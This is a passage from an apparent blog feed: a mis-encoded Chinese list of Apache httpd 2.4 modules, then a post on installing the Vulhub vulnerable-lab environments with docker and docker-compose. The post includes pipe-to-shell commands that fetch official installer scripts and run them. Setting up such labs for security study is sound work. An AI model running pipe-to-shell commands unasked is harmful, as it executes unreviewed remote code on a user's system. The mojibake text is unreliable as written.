href="http://httpd.apache.org/docs/2.4/mod/mod_authn_file.html">mod_authn_file</a></p><p>ä½¿ç”¨æ–‡æœ¬æ–‡ä»¶è¿›è¡Œç”¨æˆ·èº«ä»½éªŒè¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authn_socache.html">mod_authn_socache</a></p><p>ç®¡ç†èº«ä»½éªŒè¯å‡­æ®ç¼“å­˜ä»¥å‡è½»åç«¯çš„è´Ÿè½½</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authnz_fcgi.html">mod_authnz_fcgi</a></p><p>å…è®¸ FastCGI æˆæƒå™¨åº”ç”¨ç¨‹åºå¤„ç† Apache httpd èº«ä»½éªŒè¯å’Œæˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authnz_ldap.html">mod_authnz_ldap</a></p><p>å…è®¸ä½¿ç”¨ LDAP ç›®å½•æ¥å­˜å‚¨ç”¨äº HTTP åŸºæœ¬èº«ä»½éªŒè¯çš„æ•°æ®åº“</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_core.html">mod_authz_core</a></p><p>æ ¸å¿ƒæˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_dbd.html">mod_authz_dbd</a></p><p>ä½¿ç”¨ SQL è¿›è¡Œç»„æˆæƒå’Œç™»å½•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_dbm.html">mod_authz_dbm</a></p><p>ä½¿ç”¨ DBM æ–‡ä»¶çš„ç»„æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_groupfile.html">mod_authz_groupfile</a></p><p>ä½¿ç”¨çº¯æ–‡æœ¬æ–‡ä»¶çš„ç»„æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_host.html">mod_authz_host</a></p><p>åŸºäºä¸»æœºï¼ˆåç§°æˆ– IP åœ°å€ï¼‰çš„ç»„æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_owner.html">mod_authz_owner</a></p><p>åŸºäºæ–‡ä»¶æ‰€æœ‰æƒçš„æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_authz_user.html">mod_authz_user</a></p><p>ç”¨æˆ·æˆæƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_autoindex.html">mod_autoindex</a></p><p>è‡ªåŠ¨ç”Ÿæˆç›®å½•ç´¢å¼•ï¼Œç±»ä¼¼äº Unix å‘½ä»¤æˆ– Win32 shell commandlsdir</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_brotli.html">mod_brotli</a></p><p>åœ¨å°†å†…å®¹äº¤ä»˜ç»™å®¢æˆ·ç«¯ä¹‹å‰é€šè¿‡ Brotli å‹ç¼©å†…å®¹</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_buffer.html">mod_buffer</a></p><p>æ”¯æŒè¯·æ±‚ç¼“å†²</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache.html">mod_cache</a></p><p>ç¬¦åˆ RFC 2616 çš„ HTTP ç¼“å­˜è¿‡æ»¤å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache_disk.html">mod_cache_disk</a></p><p>ç”¨äº HTTP ç¼“å­˜è¿‡æ»¤å™¨çš„åŸºäºç£ç›˜çš„å­˜å‚¨æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cache_socache.html">mod_cache_socache</a></p><p>åŸºäºå…±äº«å¯¹è±¡ç¼“å­˜ (socache) çš„å­˜å‚¨æ¨¡å—ï¼Œç”¨äº HTTP ç¼“å­˜è¿‡æ»¤å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cern_meta.html">mod_cern_meta</a></p><p>CERN httpd å…ƒæ–‡ä»¶è¯­ä¹‰</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cgi.html">mod_cgi</a></p><p>CGIè„šæœ¬çš„æ‰§è¡Œ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_cgid.html">mod_cgid</a></p><p>ä½¿ç”¨å¤–éƒ¨ CGI å®ˆæŠ¤ç¨‹åºæ‰§è¡Œ CGI è„šæœ¬</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_charset_lite.html">mod_charset_lite</a></p><p>æŒ‡å®šå­—ç¬¦é›†è½¬æ¢æˆ–é‡æ–°ç¼–ç </p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_data.html">mod_data</a></p><p>å°†å“åº”æ­£æ–‡è½¬æ¢ä¸º RFC2397 æ•°æ® URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav.html">mod_dav</a></p><p>åˆ†å¸ƒå¼åˆ›ä½œå’Œç‰ˆæœ¬æ§åˆ¶<a href="http://www.webdav.org/">WebDAV</a> åŠŸèƒ½</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav_fs.html">mod_dav_fs</a></p><p><code>mod_dav</code> çš„æ–‡ä»¶ç³»ç»Ÿæä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dav_lock.html">mod_dav_lock</a></p><p><code>mod_dav</code> çš„é€šç”¨é”å®šæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dbd.html">mod_dbd</a></p><p>ç®¡ç† SQL æ•°æ®åº“è¿æ¥</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_deflate.html">mod_deflate</a></p><p>åœ¨å°†å†…å®¹äº¤ä»˜ç»™å®¢æˆ·ç«¯ä¹‹å‰å¯¹å…¶è¿›è¡Œå‹ç¼©</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dialup.html">mod_dialup</a></p><p>ä»¥å„ç§æ—§è°ƒåˆ¶è§£è°ƒå™¨æ ‡å‡†å®šä¹‰çš„å¸¦å®½é€Ÿç‡é™åˆ¶å‘é€é™æ€å†…å®¹</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dir.html">mod_dir</a></p><p>æä¾›â€è·Ÿè¸ªæ–œçº¿â€é‡å®šå‘å’ŒæœåŠ¡ç›®å½•ç´¢å¼•æ–‡ä»¶</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_dumpio.html">mod_dumpio</a></p><p>æ ¹æ®éœ€è¦å°†æ‰€æœ‰ I/O è½¬å‚¨åˆ°é”™è¯¯æ—¥å¿—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_echo.html">mod_echo</a></p><p>ä¸€ä¸ªç®€å•çš„å›æ˜¾æœåŠ¡å™¨æ¥è¯´æ˜åè®®æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_env.html">mod_env</a></p><p>ä¿®æ”¹ä¼ é€’ç»™ CGI è„šæœ¬å’Œ SSI é¡µé¢çš„ç¯å¢ƒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_example_hooks.html">mod_example_hooks</a></p><p>è¯´æ˜ Apache æ¨¡å— API</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_expires.html">mod_expires</a></p><p>æ ¹æ®ç”¨æˆ·æŒ‡å®šçš„æ ‡å‡†ç”Ÿæˆå’Œ HTTP æ ‡å¤´<code>ExpiresCache-Control</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ext_filter.html">mod_ext_filter</a></p><p>åœ¨ä¼ é€’ç»™å®¢æˆ·ç«¯ä¹‹å‰é€šè¿‡å¤–éƒ¨ç¨‹åºä¼ é€’å“åº”æ­£æ–‡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_file_cache.html">mod_file_cache</a></p><p>åœ¨å†…å­˜ä¸­ç¼“å­˜é™æ€æ–‡ä»¶åˆ—è¡¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_filter.html">mod_filter</a></p><p>ä¸Šä¸‹æ–‡æ•æ„Ÿçš„æ™ºèƒ½è¿‡æ»¤å™¨é…ç½®æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_headers.html">mod_headers</a></p><p>HTTP è¯·æ±‚å’Œå“åº”æ ‡é¢˜çš„è‡ªå®šä¹‰</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_heartbeat.html">mod_heartbeat</a></p><p>å°†å¸¦æœ‰æœåŠ¡å™¨çŠ¶æ€çš„æ¶ˆæ¯å‘é€åˆ°å‰ç«¯ä»£ç†</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_heartmonitor.html">mod_heartmonitor</a></p><p>mod_heartbeatæºæœåŠ¡å™¨çš„é›†ä¸­ç›‘è§†å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_http2.html">mod_http2</a></p><p>æ”¯æŒ HTTP/2 è¿è¾“å±‚</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ident.html">mod_ident</a></p><p>RFC 1413 æ ‡è¯†æŸ¥æ‰¾</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_imagemap.html">mod_imagemap</a></p><p>æœåŠ¡å™¨ä¾§å›¾åƒæ˜ åƒå¤„ç†</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_include.html">mod_include</a></p><p>æœåŠ¡å™¨è§£æ html æ–‡æ¡£ï¼ˆæœåŠ¡å™¨ä¾§åŒ…å«ï¼‰</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_info.html">mod_info</a></p><p>æä¾›æœåŠ¡å™¨é…ç½®çš„å…¨é¢æ¦‚è¿°</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_isapi.html">mod_isapi</a></p><p>Apache for Windows ä¸­çš„ ISAPI æ‰©å±•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_bybusyness.html">mod_lbmethod_bybusyness</a></p><p>å¾…å®šè¯·æ±‚è®¡æ•°è´Ÿè½½å¹³è¡¡å™¨è°ƒåº¦å™¨ç®—æ³•<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_byrequests.html">mod_lbmethod_byrequests</a></p><p>è¯·æ±‚è®¡ç®—è´Ÿè½½å¹³è¡¡å™¨è°ƒåº¦å™¨ç®—æ³•<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_bytraffic.html">mod_lbmethod_bytraffic</a></p><p>åŠ æƒæµé‡è®¡æ•°è´Ÿè½½å¹³è¡¡å™¨è°ƒåº¦å™¨ç®—æ³•<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lbmethod_heartbeat.html">mod_lbmethod_heartbeat</a></p><p>å¿ƒè·³æµé‡è®¡æ•°è´Ÿè½½å¹³è¡¡å™¨è°ƒåº¦å™¨ç®—æ³•<code>mod_proxy_balancer</code></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ldap.html">mod_ldap</a></p><p>ä¾›å…¶ä»– LDAP æ¨¡å—ä½¿ç”¨çš„ LDAP è¿æ¥æ± å’Œç»“æœç¼“å­˜æœåŠ¡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_log_config.html">mod_log_config</a></p><p>è®°å½•å‘æœåŠ¡å™¨æå‡ºçš„è¯·æ±‚</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_log_debug.html">mod_log_debug</a></p><p>é¢å¤–çš„å¯é…ç½®è°ƒè¯•æ—¥å¿—è®°å½•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_log_forensic.html">mod_log_forensic</a></p><p>å¯¹æœåŠ¡å™¨å‘å‡ºçš„è¯·æ±‚è¿›è¡Œå–è¯è®°å½•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_logio.html">mod_logio</a></p><p>è®°å½•æ¯ä¸ªè¯·æ±‚çš„è¾“å…¥å’Œè¾“å‡ºå­—èŠ‚</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_lua.html">mod_lua</a></p><p>å°† Lua æŒ‚é’©æä¾›åˆ° httpd è¯·æ±‚å¤„ç†çš„å„ä¸ªéƒ¨åˆ†</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_macro.html">mod_macro</a></p><p>åœ¨ apache httpd è¿è¡Œæ—¶é…ç½®æ–‡ä»¶ä¸­æä¾›å®</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_md.html">mod_md</a></p><p>è·¨è™šæ‹Ÿä¸»æœºç®¡ç†åŸŸï¼Œé€šè¿‡ ACME åè®®æä¾›è¯ä¹¦</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime.html">mod_mime</a></p><p>å°†è¯·æ±‚çš„æ–‡ä»¶åçš„æ‰©å±•åä¸æ–‡ä»¶çš„è¡Œä¸ºï¼ˆå¤„ç†ç¨‹åºå’Œè¿‡æ»¤å™¨ï¼‰å’Œå†…å®¹ï¼ˆmime ç±»å‹ã€è¯­è¨€ã€å­—ç¬¦é›†å’Œç¼–ç ï¼‰ç›¸å…³è” </p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_mime_magic.html">mod_mime_magic</a></p><p>é€šè¿‡æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„å‡ ä¸ªå­—èŠ‚æ¥ç¡®å®šæ–‡ä»¶çš„ MIME ç±»å‹</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_negotiation.html">mod_negotiation</a></p><p>æä¾›<a href="http://httpd.apache.org/docs/2.4/content-negotiation.html">å†…å®¹åå•†</a></p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_nw_ssl.html">mod_nw_ssl</a></p><p>ä¸º NetWare å¯ç”¨ SSL åŠ å¯†</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_privileges.html">mod_privileges</a></p><p>æ”¯æŒ Solaris ç‰¹æƒå’Œåœ¨ä¸åŒç”¨æˆ· ID ä¸‹è¿è¡Œè™šæ‹Ÿä¸»æœº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy.html">mod_proxy</a></p><p>å¤šåè®®ä»£ç†/ç½‘å…³æœåŠ¡å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_ajp.html">mod_proxy_ajp</a></p><p>mod_proxy çš„ AJP æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_balancer.html">mod_proxy_balancer</a></p><p><code>mod_proxy</code>è´Ÿè½½å¹³è¡¡çš„æ‰©å±•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_connect.html">mod_proxy_connect</a></p><p>ç”¨äºè¯·æ±‚å¤„ç†çš„ mod_proxy æ‰©å±•CONNECT</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_express.html">mod_proxy_express</a></p><p>mod_proxy çš„åŠ¨æ€å¤§è§„æ¨¡åå‘ä»£ç†æ‰©å±•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_fcgi.html">mod_proxy_fcgi</a></p><p>ç”¨äº mod_proxy çš„ FastCGI æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_fdpass.html">mod_proxy_fdpass</a></p><p>ç”¨äº mod_proxy çš„ fdpass å¤–éƒ¨è¿›ç¨‹æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_ftp.html">mod_proxy_ftp</a></p><p>mod_proxy çš„ FTP æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_hcheck.html">mod_proxy_hcheck</a></p><p>å¯¹ mod_proxy çš„ Balancer æˆå‘˜ï¼ˆå·¥ä½œäººå‘˜ï¼‰è¿›è¡ŒåŠ¨æ€å¥åº·æ£€æŸ¥</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_html.html">mod_proxy_html</a></p><p>é‡å†™ HTML é“¾æ¥ä»¥ç¡®ä¿å®ƒä»¬å¯ä»¥ä»ä»£ç†ä¸Šä¸‹æ–‡ä¸­çš„å®¢æˆ·ç«¯ç½‘ç»œå¯»å€</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_http.html">mod_proxy_http</a></p><p>mod_proxy çš„ HTTP æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_http2.html">mod_proxy_http2</a></p><p>mod_proxy çš„ HTTP/2 æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_scgi.html">mod_proxy_scgi</a></p><p>ç”¨äº mod_proxy çš„ SCGI ç½‘å…³æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_uwsgi.html">mod_proxy_uwsgi</a></p><p>ç”¨äº mod_proxy çš„ UWSGI ç½‘å…³æ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_proxy_wstunnel.html">mod_proxy_wstunnel</a></p><p>ç”¨äº mod_proxy çš„ Websockets æ”¯æŒæ¨¡å—</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ratelimit.html">mod_ratelimit</a></p><p>å®¢æˆ·ç«¯å¸¦å®½é€Ÿç‡é™åˆ¶</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_reflector.html">mod_reflector</a></p><p>é€šè¿‡è¾“å‡ºè¿‡æ»¤å™¨å †æ ˆå°†è¯·æ±‚æ­£æ–‡åæ˜ ä¸ºå“åº”</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_remoteip.html">mod_remoteip</a></p><p>å°†è¿æ¥çš„åŸå§‹å®¢æˆ·ç«¯ IP åœ°å€æ›¿æ¢ä¸ºä»£ç†æˆ–è´Ÿè½½å‡è¡¡å™¨é€šè¿‡è¯·æ±‚æ ‡å¤´æä¾›çš„ç”¨æˆ·ä»£ç† IP åœ°å€åˆ—è¡¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_reqtimeout.html">mod_reqtimeout</a></p><p>è®¾ç½®æ¥æ”¶è¯·æ±‚çš„è¶…æ—¶å’Œæœ€å°æ•°æ®é€Ÿç‡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_request.html">mod_request</a></p><p>ç”¨äºå¤„ç†å’Œæä¾›å¯ç”¨ HTTP è¯·æ±‚æ­£æ–‡çš„è¿‡æ»¤å™¨</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_rewrite.html">mod_rewrite</a></p><p>æä¾›åŸºäºè§„åˆ™çš„é‡å†™å¼•æ“æ¥å³æ—¶é‡å†™è¯·æ±‚çš„ URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_sed.html">mod_sed</a></p><p>ä½¿ç”¨è¯­æ³•è¿‡æ»¤è¾“å…¥ï¼ˆè¯·æ±‚ï¼‰å’Œè¾“å‡ºï¼ˆå“åº”ï¼‰å†…å®¹</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session.html">mod_session</a></p><p>ä¼šè¯æ”¯æŒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_cookie.html">mod_session_cookie</a></p><p>åŸºäº Cookie çš„ä¼šè¯æ”¯æŒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_crypto.html">mod_session_crypto</a></p><p>ä¼šè¯åŠ å¯†æ”¯æŒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_session_dbd.html">mod_session_dbd</a></p><p>åŸºäº DBD/SQL çš„ä¼šè¯æ”¯æŒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_setenvif.html">mod_setenvif</a></p><p>å…è®¸æ ¹æ®è¯·æ±‚çš„ç‰¹å¾è®¾ç½®ç¯å¢ƒå˜é‡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_slotmem_plain.html">mod_slotmem_plain</a></p><p>åŸºäºæ’æ§½çš„å…±äº«å†…å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_slotmem_shm.html">mod_slotmem_shm</a></p><p>åŸºäºæ’æ§½çš„å…±äº«å†…å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_so.html">mod_so</a></p><p>åœ¨å¯åŠ¨æˆ–é‡æ–°å¯åŠ¨æ—¶å°†å¯æ‰§è¡Œä»£ç å’Œæ¨¡å—åŠ è½½åˆ°æœåŠ¡å™¨ä¸­</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_dbm.html">mod_socache_dbm</a></p><p>åŸºäº DBM çš„å…±äº«å¯¹è±¡ç¼“å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_dc.html">mod_socache_dc</a></p><p>åŸºäº Distcache çš„å…±äº«å¯¹è±¡ç¼“å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_memcache.html">mod_socache_memcache</a></p><p>åŸºäº Memcache çš„å…±äº«å¯¹è±¡ç¼“å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_redis.html">mod_socache_redis</a></p><p>åŸºäº Redis çš„å…±äº«å¯¹è±¡ç¼“å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_socache_shmcb.html">mod_socache_shmcb</a></p><p>åŸºäº shmcb çš„å…±äº«å¯¹è±¡ç¼“å­˜æä¾›ç¨‹åº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_speling.html">mod_speling</a></p><p>å°è¯•é€šè¿‡å¿½ç•¥å¤§å°å†™æˆ–å°è¯•æ›´æ­£å„ç§å°æ‹¼å†™é”™è¯¯æ¥æ›´æ­£é”™è¯¯çš„ URL</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_ssl.html">mod_ssl</a></p><p>ä½¿ç”¨å®‰å…¨å¥—æ¥å­—å±‚ (SSL) å’Œä¼ è¾“å±‚å®‰å…¨ (TLS) åè®®çš„å¼ºå¯†ç æœ¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_status.html">mod_status</a></p><p>æä¾›æœ‰å…³æœåŠ¡å™¨æ´»åŠ¨å’Œæ€§èƒ½çš„ä¿¡æ¯</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_substitute.html">mod_substitute</a></p><p>å¯¹å“åº”ä½“æ‰§è¡Œæœç´¢å’Œæ›¿æ¢æ“ä½œ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_suexec.html">mod_suexec</a></p><p>å…è®¸ CGI è„šæœ¬ä½œä¸ºæŒ‡å®šçš„ç”¨æˆ·å’Œç»„è¿è¡Œ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_systemd.html">mod_systemd</a></p><p>ä¸ºç³»ç»Ÿé›†æˆæä¾›æ›´å¥½çš„æ”¯æŒ</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_unique_id.html">mod_unique_id</a></p><p>ä¸ºæ¯ä¸ªè¯·æ±‚æä¾›ä¸€ä¸ªå…·æœ‰å”¯ä¸€æ ‡è¯†ç¬¦çš„ç¯å¢ƒå˜é‡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_unixd.html">mod_unixd</a></p><p>Unix ç³»åˆ—å¹³å°çš„åŸºæœ¬ï¼ˆå¿…éœ€ï¼‰å®‰å…¨æ€§</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_userdir.html">mod_userdir</a></p><p>ç‰¹å®šäºç”¨æˆ·çš„ç›®å½•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_usertrack.html">mod_usertrack</a></p><p>ç«™ç‚¹ä¸Šç”¨æˆ·æ´»åŠ¨çš„ç‚¹å‡»æµæ—¥å¿—è®°å½•</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_version.html">mod_version</a></p><p>ç‰ˆæœ¬ç›¸å…³é…ç½®</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_vhost_alias.html">mod_vhost_alias</a></p><p>æä¾›åŠ¨æ€é…ç½®çš„æµ·é‡è™šæ‹Ÿä¸»æœº</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_watchdog.html">mod_watchdog</a></p><p>ä¸ºå…¶ä»–æ¨¡å—æä¾›åŸºç¡€è®¾æ–½ä»¥å®šæœŸè¿è¡Œä»»åŠ¡</p><p><a href="http://httpd.apache.org/docs/2.4/mod/mod_xml2enc.html">mod_xml2enc</a></p><p>å¢å¼ºäº†å¯¹åŸºäº libxml2 çš„è¿‡æ»¤å™¨æ¨¡å—çš„å­—ç¬¦é›†/å›½é™…åŒ–æ”¯æŒ</p><p>[^æ›´å¤šè¯·å‚è€ƒ]: <a href="http://httpd.apache.org/docs/2.4/zh-cn/">Apache HTTP æœåŠ¡å™¨ 2.4 æ–‡æ¡£ - Apache HTTP æœåŠ¡å™¨ ç‰ˆæœ¬ 2.4</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhubå®‰è£…</title>
      <link href="/2021/07/21/vulhub-an-zhuang/"/>
      <url>/2021/07/21/vulhub-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulhubå®‰è£…"><a href="#Vulhubå®‰è£…" class="headerlink" title="Vulhubå®‰è£…"></a>Vulhubå®‰è£…</h1><p>æ“ä½œç³»ç»Ÿï¼šubuntu20</p><h2 id="dockerå®‰è£…"><a href="#dockerå®‰è£…" class="headerlink" title="dockerå®‰è£…"></a>dockerå®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> https://get.docker.com/ <span class="token operator">|</span> <span class="token function">sh</span> or<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> docker.io<span class="token function">docker</span> version<span class="token comment">#è¿”å›åˆ™æˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å®‰è£…docker-compose"><a href="#å®‰è£…docker-compose" class="headerlink" title="å®‰è£…docker-compose"></a>å®‰è£…docker-compose</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#å…ˆå®‰è£…pip</span><span class="token function">curl</span> <span class="token parameter variable">-s</span> https://bootstrap.pypa.io/get-pip.py <span class="token operator">|</span> python3pip <span class="token function">install</span> <span class="token function">docker-compose</span><span class="token function">docker-compose</span> <span class="token parameter variable">-v</span><span class="token comment">#æœ‰è¿”å›è¯´æ˜æˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Vulhubå®‰è£…-1"><a href="#Vulhubå®‰è£…-1" class="headerlink" title="Vulhubå®‰è£…"></a>Vulhubå®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#è‡ªå·±åˆ›å»ºä¸€ä¸ªç›®å½•æˆ–è€…ç›´æ¥åœ¨ä¸»ç›®å½•ä¸‹æ‰§è¡Œï¼Œä¼šè‡ªè¡Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹</span><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="è¿è¡Œç¯å¢ƒ"><a href="#è¿è¡Œç¯å¢ƒ" class="headerlink" title="è¿è¡Œç¯å¢ƒ"></a>è¿è¡Œç¯å¢ƒ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#è¿›å…¥æƒ³è¦å®éªŒçš„ç¯å¢ƒ</span><span class="token builtin class-name">cd</span> flask/ssti<span class="token function">docker-compose</span> build<span class="token comment">#æ›´æ–°é…ç½®åé‡æ–°ç¼–è¯‘é¶åœºç¯å¢ƒ</span><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token comment">#æ¨èåè€…</span><span class="token function">docker</span> <span class="token function">ps</span><span class="token comment">#æŸ¥çœ‹è¿è¡Œç«¯å£</span><span class="token comment">#ç‰©ç†æœºä¸­è®¿é—®ï¼šip:port</span><span class="token function">docker-compose</span> down<span class="token comment">#ç»“æŸè¿è¡Œ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTMLè½¬ä¹‰å­—ç¬¦</title>
      <link href="/2021/07/20/html-zhuan-yi-zi-fu/"/>
      <url>/2021/07/20/html-zhuan-yi-zi-fu/</url>
      
